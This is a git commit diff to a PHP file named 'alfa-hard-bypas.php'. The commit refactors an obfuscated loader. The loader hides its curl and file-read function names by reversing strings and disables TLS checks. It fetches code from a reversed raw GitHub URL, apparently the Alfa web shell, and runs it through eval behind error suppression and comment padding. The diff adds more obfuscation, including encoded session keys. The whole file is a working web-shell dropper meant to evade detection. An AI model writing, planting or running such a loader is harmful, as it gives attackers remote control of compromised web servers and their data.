cd2d9a65e7c6d6b1b797d920903525c336cb71d4
NuLz <129581037+haxorstars@users.noreply.github.com>
2024-07-23 03:09:44 +0700

    NuLz

--- alfa/alfa-hard-bypas.php
+++ alfa/alfa-hard-bypas.php
@@ -5,23 +5,54 @@ error_reporting(0);
 class UrlFetcher
 {
     private $userAgent;
-    
+    private $funcArray;
+
     public function __construct()
     {
         $this->userAgent = 'Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0';
+        $this->funcArray = array(
+            'crl' => array(
+                'exec' => strrev('cexe_lruc'),
+                'init' => strrev('tini_lruc'),
+                'opt' => strrev('tpotes_lruc'),
+                'close' => strrev('esolc_lruc')
+            ),
+            'file' => array(
+                'getContents' => strrev('stnetnoc_teg_elif'),
+                'open' => strrev('nepof'),
+                'streamContents' => strrev('stnetnoc_teg_maerts'),
+                'close' => strrev('esolcf')
+            )
+        );
+    }
+
+    private function obfuscate($data)
+    {
+        return base64_encode(strrev($data));
+    }
+
+    private function deobfuscate($data)
+    {
+        return strrev(base64_decode($data));
+    }
+
+    private function getFunc($type, $name)
+    {
+        return $this->funcArray[$type][$name];
     }
 
     public function fetch($url)
     {
-        $crl_exc = strrev('cexe_lruc');
-        $fget = strrev('stnetnoc_teg_elif');
-        $fo = strrev('nepof');
-        $sget = strrev('stnetnoc_teg_maerts');
-        if (function_exists($crl_exc)) {
+        $crl_exec = $this->getFunc('crl', 'exec');
+        $file_getContents = $this->getFunc('file', 'getContents');
+        $file_open = $this->getFunc('file', 'open');
+        $stream_getContents = $this->getFunc('file', 'streamContents');
+
+        if (function_exists($crl_exec)) {
             return $this->crlFetch($url);
-        } elseif (function_exists($fget)) {
-            return $fget($url);
-        } elseif (function_exists($fo) && function_exists($sget)) {
+        } elseif (function_exists($file_getContents)) {
+            return $file_getContents($url);
+        } elseif (function_exists($file_open) && function_exists($stream_getContents)) {
             return $this->foFetch($url);
         } else {
             return false;
@@ -30,41 +61,45 @@ class UrlFetcher
 
     private function crlFetch($url)
     {
-        $crl_exc = strrev('cexe_lruc');
-        $crl_init = strrev('tini_lruc');
-        $crl_opt = strrev('tpotes_lruc');
-        $crl_cls = strrev('esolc_lruc');
+        $crl_init = $this->getFunc('crl', 'init');
+        $crl_opt = $this->getFunc('crl', 'opt');
+        $crl_close = $this->getFunc('crl', 'close');
+        $crl_exec = $this->getFunc('crl', 'exec');
+
         $conn = $crl_init($url);
         $crl_opt($conn, CURLOPT_RETURNTRANSFER, 1);
         $crl_opt($conn, CURLOPT_FOLLOWLOCATION, 1);
         $crl_opt($conn, CURLOPT_USERAGENT, $this->userAgent);
         $crl_opt($conn, CURLOPT_SSL_VERIFYPEER, 0);
         $crl_opt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-        
-        if (isset($_SESSION['nulzganteng'])) {
-            $crl_opt($conn, CURLOPT_COOKIE, $_SESSION['nulzganteng']);
+
+        if (isset($_SESSION[$this->obfuscate('nulzganteng')])) {
+            $crl_opt($conn, CURLOPT_COOKIE, $_SESSION[$this->obfuscate('nulzganteng')]);
         }
 
-        $url_get_contents_data = $crl_exc($conn);
-        $crl_cls($conn);
+        $url_get_contents_data = $crl_exec($conn);
+        $crl_close($conn);
 
         return $url_get_contents_data;
     }
 
     private function foFetch($url)
     {
-        $sget = strrev('stnetnoc_teg_maerts');
-        $fo = strrev('nepof');
-        $fc = strrev('esolcf');
-        $handle = $fo($url, "r");
-        $url_get_contents_data = $sget($handle);
-        $fc($handle);
+        $file_open = $this->getFunc('file', 'open');
+        $stream_getContents = $this->getFunc('file', 'streamContents');
+        $file_close = $this->getFunc('file', 'close');
+
+        $handle = $file_open($url, "r");
+        $url_get_contents_data = $stream_getContents($handle);
+        $file_close($handle);
 
         return $url_get_contents_data;
     }
 }
 
 $fetcher = new UrlFetcher();
-$reversedUrl = strrev('php.sapyb-cne-afla/afla/niam/evihcra/sratsroxah/moc.tnetnocresubuhtig.war//:sptth');
-$nulzganteng = $fetcher->fetch($reversedUrl);
+$nulzpro = strrev('php.cne-afla/afla/niam/evihcra/sratsroxah/moc.tnetnocresubuhtig.war//:sptth');
+$nulzganteng = $fetcher->fetch($nulzpro);
+
 /****/@/*55555*/null; /******/@/*55555*/eval/*######*/('?>' . $nulzganteng);
+?>
